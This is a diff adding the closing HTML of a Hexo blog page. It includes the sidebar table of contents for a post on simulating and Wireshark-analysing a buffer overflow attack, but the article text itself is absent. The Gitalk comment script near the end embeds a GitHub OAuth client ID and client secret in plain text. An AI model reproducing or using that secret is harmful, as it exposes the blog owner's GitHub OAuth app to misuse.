+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/02/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E6%B3%AA%E6%BB%B4%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/" rel="next" title="【Wireshark 系列】泪滴攻击分析">
+                <i class="fa fa-chevron-left"></i> 【Wireshark 系列】泪滴攻击分析
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+  <div id="gitalk-container"></div>
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/uploads/Profile.jpg"
+                alt="Andy Wu" />
+            
+              <p class="site-author-name" itemprop="name">Andy Wu</p>
+              <p class="site-description motion-element" itemprop="description">Cover the face and straight ahead.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">20</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          <!-- 2020年6月26日11:07:23 -->
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" class="cc-opacity" target="_blank">
+              <img src="/uploads/by-nc-nd.svg" alt="Creative Commons"/>
+            </a>
+          </div>
+
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/ZER0-Nu1L" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:wcb534813346@126.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Blogroll
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://acherstyx.github.io/" title="AcherStyx" target="_blank">AcherStyx</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://fitz.hasentu.com/" title="五维生物" target="_blank">五维生物</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ff-0xff.github.io/" title="ff-0xff" target="_blank">ff-0xff</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://el-z10.github.io/" title="EL" target="_blank">EL</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://gemini-lin.github.io/" title="Gemini-Lin" target="_blank">Gemini-Lin</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#"><span class="nav-number">1.</span> <span class="nav-text">缓冲区溢出攻击的相关理论</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#"><span class="nav-number">2.</span> <span class="nav-text">模拟缓冲区溢出攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#实验环境"><span class="nav-number">2.1.</span> <span class="nav-text">实验环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#实验步骤"><span class="nav-number">2.2.</span> <span class="nav-text">实验步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#开启服务"><span class="nav-number">2.2.1.</span> <span class="nav-text">开启服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#缓冲区溢出攻击"><span class="nav-number">2.2.2.</span> <span class="nav-text">缓冲区溢出攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#控制"><span class="nav-number">2.2.3.</span> <span class="nav-text">控制</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#"><span class="nav-number">3.</span> <span class="nav-text">使用 Wireshark 分析缓冲区溢出攻击</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#判定攻击"><span class="nav-number">3.1.</span> <span class="nav-text">判定攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#一个疑点的分析"><span class="nav-number">3.2.</span> <span class="nav-text">一个疑点的分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#缓冲区大小"><span class="nav-number">3.3.</span> <span class="nav-text">缓冲区大小</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反向木马"><span class="nav-number">3.4.</span> <span class="nav-text">反向木马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#应对措施"><span class="nav-number">3.5.</span> <span class="nav-text">应对措施</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#"><span class="nav-number">4.</span> <span class="nav-text">参考资料</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+ 
+ <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+    </script>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder"> Andy Wu &nbsp | &nbsp </span>
+
+  <div class="powered-by">
+  <i class="fa fa-user-md"></i><span id="busuanzi_container_site_pv">
+    Number of visitors:<span id="busuanzi_value_site_pv"></span>
+  </span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">69.9k</span>
+  
+</div>
+
+
+</div>
+
+<!--
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+-->
+
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count"></span>
+</div>
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+  <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+  <div id="gitalk-container"></div>
+  <script src="/js/src/md5.min.js"></script>
+  <script type="text/javascript">
+    var gitalk = new Gitalk({
+      clientID: 'b559026a8469cfafb7e3',
+      clientSecret: '68757dba62da9ddd3078e0b24c9c146b555deecc',
+      repo: 'ZER0-Nu1L.github.io',
+      owner: 'ZER0-Nu1L',
+      admin: ['ZER0-Nu1L'],
+      id: md5(location.pathname),
+      distractionFreeMode: 'true'
+    })
+    gitalk.render('gitalk-container')
+  </script>
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+
+  <!-- 代码块复制功能 -->
+  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>
+  <script type="text/javascript" src="/js/src/custom.js"></script>
+</body>
+</html>
